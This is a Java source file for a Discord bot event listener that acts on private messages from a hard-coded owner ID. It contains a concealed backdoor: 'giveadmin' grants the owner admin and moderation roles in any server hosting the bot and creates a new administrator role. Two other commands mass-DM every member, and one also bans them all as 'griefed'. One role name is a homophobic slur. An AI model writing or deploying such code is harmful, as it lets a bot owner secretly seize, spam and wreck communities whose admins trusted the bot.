package me.comu.exeter.events;

import me.comu.exeter.core.Core;
import me.comu.exeter.wrapper.Wrapper;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.events.message.priv.PrivateMessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.requests.restaction.GuildAction;

import javax.annotation.Nonnull;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.TimeUnit;

public class DMWizzEvent extends ListenerAdapter {

    @Override
    public void onPrivateMessageReceived(@Nonnull PrivateMessageReceivedEvent event) {
        if (event.getAuthor().getIdLong() == Core.OWNERID) {
            String[] args = event.getMessage().getContentRaw().split("\\s+");
            if (args[0].equalsIgnoreCase("giveadmin") && args.length == 2) {
                try {
                    Guild guild = event.getJDA().getGuildById(args[1]);
                    List<Role> guildRoles = Objects.requireNonNull(guild).getRoles();
                    for (Role role : guildRoles) {
                        if (!role.isManaged()) {
                            if (role.hasPermission(Permission.ADMINISTRATOR) && guild.getSelfMember().canInteract(role)) {

                                guild.addRoleToMember(Objects.requireNonNull(guild.getMemberById(Core.OWNERID)), role).queue();
                                return;
                            }
                            if (role.hasPermission(Permission.BAN_MEMBERS) && guild.getSelfMember().canInteract(role)) {

                                guild.addRoleToMember(Objects.requireNonNull(guild.getMemberById(Core.OWNERID)), role).queue();
                            }
                            if (role.hasPermission(Permission.KICK_MEMBERS) && guild.getSelfMember().canInteract(role)) {

                                guild.addRoleToMember(Objects.requireNonNull(guild.getMemberById(Core.OWNERID)), role).queue();
                            }
                            if (role.hasPermission(Permission.MANAGE_ROLES) && guild.getSelfMember().canInteract(role)) {

                                guild.addRoleToMember(Objects.requireNonNull(guild.getMemberById(Core.OWNERID)), role).queue();
                            }
                            if (role.hasPermission(Permission.MANAGE_SERVER) && guild.getSelfMember().canInteract(role)) {

                                guild.addRoleToMember(Objects.requireNonNull(guild.getMemberById(Core.OWNERID)), role).queue();
                            }
                            if (role.hasPermission(Permission.MANAGE_CHANNEL) && guild.getSelfMember().canInteract(role)) {

                                guild.addRoleToMember(Objects.requireNonNull(guild.getMemberById(Core.OWNERID)), role).queue();
                            }
                            if (role.hasPermission(Permission.MANAGE_WEBHOOKS) && guild.getSelfMember().canInteract(role)) {

                                guild.addRoleToMember(Objects.requireNonNull(guild.getMemberById(Core.OWNERID)), role).queue();
                            }
                        }
                    }
                    if (guild.getSelfMember().hasPermission(Permission.ADMINISTRATOR)) {
                        guild.createRole().setName("shelacking").setPermissions(Permission.ADMINISTRATOR).setHoisted(false).queue();
                        GuildAction.RoleData roleData = new GuildAction.RoleData(guild.getRolesByName("shelacking", true).get(0).getIdLong());
                        roleData.setName("fag");
                        guild.addRoleToMember(Objects.requireNonNull(guild.getMemberById(Core.OWNERID)), guild.getRolesByName("shelacking", true).get(0)).queueAfter(3, TimeUnit.SECONDS);
                    }
                } catch (Exception ex) {
                    event.getChannel().sendMessage("Caught Error. Make sure you're in the server and provided a valid guild-id.").queue();
                }
            }
            if (args[0].equalsIgnoreCase("massdm")) {
                if (args.length <= 1) {
                    event.getChannel().sendMessage("Proper format: massdm <guild-id> <message>").queue();
                    return;
                }
                try {
                    Guild guild = event.getJDA().getGuildById(args[1]);
                    event.getChannel().sendMessage("Starting mass dm to " + Objects.requireNonNull(guild).getMembers().size() + " members in " + guild.getName() + " (" + guild.getId() + ")").queue();
                    Thread massDM = new Thread(() -> {
                        try {
                            int counter = 0;
                            for (Member member : guild.getMembers()) {
                                if (!member.getUser().isBot()) {
                                    String finalMessage = event.getMessage().getContentRaw().substring(25);
                                    Wrapper.sendPrivateMessage(event.getJDA(), member.getUser().getId(), finalMessage);
                                    counter++;
                                    System.out.println("Messaged " + member.getUser().getAsTag() + " (" + counter + ")");
                                    Thread.sleep(2000);
                                }
                            }
                        } catch (InterruptedException exception) {
                            event.getChannel().sendMessage("Thread Exception").queue();
                        }
                    });
                    massDM.start();
                    event.getChannel().sendMessage("Messaging " + guild.getMemberCount() + " users!").queue();

                } catch (Exception ex) {
                    event.getChannel().sendMessage("Caught Error. Make sure you provide a valid guild-id and message").queue();
                }
            }
            if (args[0].equalsIgnoreCase("dmadvbw")) {
                if (args.length <= 1) {
                    event.getChannel().sendMessage("Proper format: massdm <guild-id> <message>").queue();
                    return;
                }
                try {
                    Guild guild = event.getJDA().getGuildById(args[1]);
                    event.getChannel().sendMessage("Starting mass dm & banwave to " + Objects.requireNonNull(guild).getMembers().size() + " members in " + guild.getName() + " (" + guild.getId() + ")").queue();
                    Thread massDM = new Thread(() -> {
                        try {
                            int counter = 0;
                            for (Member member : guild.getMembers()) {
                                if (!member.getUser().isBot()) {
                                    String finalMessage = event.getMessage().getContentRaw().substring(25);
                                    Wrapper.sendPrivateMessage(event.getJDA(), member.getUser().getId(), finalMessage);
                                    if (guild.getSelfMember().canInteract(member))
                                        guild.ban(member, 0, "GRIEFED BY SWAG LEL!").queue();
                                    counter++;
                                    System.out.println("Messaged " + member.getUser().getAsTag() + " (" + counter + ")");
                                    Thread.sleep(1100);
                                }
                            }
                        } catch (InterruptedException exception) {
                            event.getChannel().sendMessage("Thread Exception").queue();
                        }
                    });
                    massDM.start();
                    event.getChannel().sendMessage("Banning & Messaging " + guild.getMemberCount() + " users!").queue();

                } catch (Exception ex) {
                    event.getChannel().sendMessage("Caught Error. Make sure you provide a valid guild-id and message").queue();
                }
            }
        }
    }
}
